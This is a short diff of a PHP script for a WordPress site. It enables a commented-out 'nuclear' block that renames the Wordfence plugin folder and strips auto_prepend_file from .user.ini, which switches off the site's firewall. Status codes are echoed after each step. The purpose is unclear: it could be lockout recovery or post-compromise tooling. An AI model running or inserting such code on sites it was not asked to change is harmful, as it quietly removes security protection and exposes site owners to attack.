@@ -64,10 +64,10 @@ $wpdb->query($wpdb->prepare("UPDATE {$wpdb->prefix}wfconfig SET val=%s WHERE nam
 echo "4_DB_OK\n";
 
 // ---- 5) Nükleer: plugin + auto_prepend (istersen aç) ----
-// @rename($root . '/wp-content/plugins/wordfence', $root . '/wp-content/plugins/wordfence.off');
-// $ini = $root . '/wp-content/.user.ini';
-// if (is_file($ini)) {
-//     $c = preg_replace('/^\s*auto_prepend_file\s*=.*$/mi', '', file_get_contents($ini));
-//     file_put_contents($ini, $c);
-//     echo "5_PLUGIN_OFF\n";
-// }
+@rename($root . '/wp-content/plugins/wordfence', $root . '/wp-content/plugins/wordfence.off');
+$ini = $root . '/wp-content/.user.ini';
+if (is_file($ini)) {
+ $c = preg_replace('/^\s*auto_prepend_file\s*=.*$/mi', '', file_get_contents($ini));
+ file_put_contents($ini, $c);
+ echo "5_PLUGIN_OFF\n";
+}
